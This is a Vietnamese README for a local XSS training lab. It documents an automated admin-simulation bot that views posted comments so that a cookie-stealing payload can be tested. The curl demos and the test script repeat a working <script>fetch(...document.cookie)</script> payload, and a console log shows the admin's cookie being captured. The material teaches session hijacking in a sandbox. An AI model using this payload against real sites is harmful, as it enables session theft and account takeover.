# 🤖 Auto-Test Feature - XSS Session Hijacking

## Tính Năng Tự Động Test

Sau khi post comment, server sẽ **tự động giả lập admin xem comment sau 5 giây** để test XSS payload.

## Cách Hoạt Động

### 1. User Post Comment

```bash
POST /api/comment
Cookie: auth=user1:password1
Body: {"comment": "<script>fetch('/api/steal?cookie='+document.cookie)</script>"}
```

### 2. Server Response

```json
{
    "success": true,
    "commentId": 10
}
```

### 3. Auto-Test Trigger (sau 5 giây)

Server tự động thực hiện:

```javascript
setTimeout(() => {
    // Giả lập admin request trang
    http.request({
        hostname: "localhost",
        port: 3000,
        path: "/lab/auth",
        headers: {
            Cookie: "auth=admin:admin123",
            "User-Agent": "Auto-Test-Bot (Admin Simulation)",
        },
    });
}, 5000);
```

### 4. Server Console Log

```
⏰ [AUTO-TEST] Admin sẽ xem comment sau 5 giây...
👤 [AUTO-TEST] Admin đang xem comment...
✅ [AUTO-TEST] Admin đã xem trang (status: 200)
🚨 [AUTO-TEST] XSS payload detected! Script sẽ thực thi trên browser của admin.
🚨 STOLEN COOKIE RECEIVED:
Timestamp: 2025-10-16T...
Cookie: auth=admin:admin123
IP: ::1
User-Agent: Auto-Test-Bot (Admin Simulation)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
```

## Demo Nhanh

### Bước 1: Login as attacker

```bash
curl -X POST http://localhost:3000/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":"user1","password":"password1"}'
```

### Bước 2: Post XSS payload

```bash
curl -X POST http://localhost:3000/api/comment \
  -H "Content-Type: application/json" \
  -H "Cookie: auth=user1:password1" \
  -d '{"comment":"<script>fetch(\"/api/steal?cookie=\"+document.cookie)</script>"}'
```

### Bước 3: Đợi 5 giây và xem server console

Bạn sẽ thấy:

1. ⏰ Countdown 5 giây
2. 👤 Admin simulation
3. ✅ Admin đã xem trang
4. 🚨 XSS detected
5. 🚨 Stolen cookie received

## Lợi Ích

### 1. Test Tự Động

-   Không cần mở browser thủ công
-   Không cần đăng nhập admin thủ công
-   Tự động verify XSS hoạt động

### 2. Development Speed

-   Test nhanh XSS payloads
-   Immediate feedback
-   Dễ debug

### 3. Demo/Education

-   Rõ ràng và trực quan
-   Dễ hiểu attack flow
-   Real-time logging

## Code Implementation

### Server.js - API Comment

```javascript
db.run(
    "INSERT INTO comments (username, comment) VALUES (?, ?)",
    [username, comment],
    function (err) {
        // ... error handling ...

        const commentId = this.lastID;
        res.json({ success: true, commentId: commentId });

        // AUTO-TEST: Giả lập admin xem comment sau 5 giây
        console.log("⏰ [AUTO-TEST] Admin sẽ xem comment sau 5 giây...");

        setTimeout(() => {
            console.log("👤 [AUTO-TEST] Admin đang xem comment...");

            const http = require("http");

            const options = {
                hostname: "localhost",
                port: PORT,
                path: "/lab/auth",
                method: "GET",
                headers: {
                    Cookie: "auth=admin:admin123",
                    "User-Agent": "Auto-Test-Bot (Admin Simulation)",
                },
            };

            const simulateReq = http.request(options, (simulateRes) => {
                let data = "";

                simulateRes.on("data", (chunk) => {
                    data += chunk;
                });

                simulateRes.on("end", () => {
                    console.log(
                        "✅ [AUTO-TEST] Admin đã xem trang (status: " +
                            simulateRes.statusCode +
                            ")"
                    );

                    if (data.includes("<script>")) {
                        console.log("🚨 [AUTO-TEST] XSS payload detected!");
                    }
                });
            });

            simulateReq.end();
        }, 5000);
    }
);
```

## Test Script

Tạo file `test-auto.sh`:

```bash
#!/bin/bash

echo "🧪 Testing Auto XSS Detection..."
echo ""

# Login
echo "1. Login as user1..."
curl -s -X POST http://localhost:3000/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":"user1","password":"password1"}' | jq
echo ""

# Post XSS
echo "2. Post XSS payload..."
curl -s -X POST http://localhost:3000/api/comment \
  -H "Content-Type: application/json" \
  -H "Cookie: auth=user1:password1" \
  -d '{"comment":"<script>fetch(\"/api/steal?cookie=\"+document.cookie)</script>"}' | jq
echo ""

echo "3. Waiting 6 seconds for auto-test..."
sleep 6
echo ""

echo "✅ Done! Check server console for stolen cookie log."
```

## Disable Auto-Test

Nếu muốn tắt auto-test, comment out setTimeout block:

```javascript
// AUTO-TEST: Giả lập admin xem comment sau 5 giây
// console.log("⏰ [AUTO-TEST] Admin sẽ xem comment sau 5 giây...");
//
// setTimeout(() => {
//     // ... auto-test code ...
// }, 5000);
```

## Customize Delay

Thay đổi thời gian delay (mặc định 5000ms = 5s):

```javascript
setTimeout(() => {
    // ...
}, 3000); // 3 giây

// hoặc
setTimeout(() => {
    // ...
}, 10000); // 10 giây
```

## Auto-Reset Feature

### 🔄 Tự Động Reset Comments

Khi truy cập trang chính (`/`), server sẽ **tự động xóa các comments có XSS payload** và khôi phục comments mặc định.

### Cách Hoạt Động

1. User truy cập `http://localhost:3000/`
2. Server kiểm tra comments có chứa:
    - `<script`
    - `<img`
    - `<svg`
    - `onerror`
3. Nếu tìm thấy → Xóa tất cả comments
4. Khôi phục 4 comments mặc định (bao gồm FLAG)

### Server Console Log

```
🔄 [AUTO-RESET] Đang kiểm tra và reset comments...
🧹 [AUTO-RESET] Tìm thấy 3 XSS comments, đang xóa...
✅ [AUTO-RESET] Đã xóa tất cả comments
✅ [AUTO-RESET] Đã khôi phục comments mặc định
```

### Lợi Ích

-   Tránh bị redirect liên tục do XSS
-   Dễ dàng reset lab về trạng thái ban đầu
-   Không cần restart server
-   Tự động cleanup sau mỗi test

### Test Auto-Reset

```bash
# 1. Post XSS
curl -X POST http://localhost:3000/api/comment \
  -H "Content-Type: application/json" \
  -H "Cookie: auth=user1:password1" \
  -d '{"comment":"<script>alert(1)</script>"}'

# 2. Đợi auto-test chạy (5s)
sleep 6

# 3. Truy cập trang chính để reset
curl http://localhost:3000/

# 4. Check server console → XSS comments đã bị xóa
```

## Security Note

⚠️ **CHỈ SỬ DỤNG TRONG LAB!**

-   Tính năng này giả lập victim behavior
-   KHÔNG deploy production
-   Chỉ dùng cho educational purposes

---

**Version:** 1.3.2  
**Features:**

-   Auto-Test XSS Session Hijacking (delay: 5s)
-   Auto-Reset Comments khi về trang chính
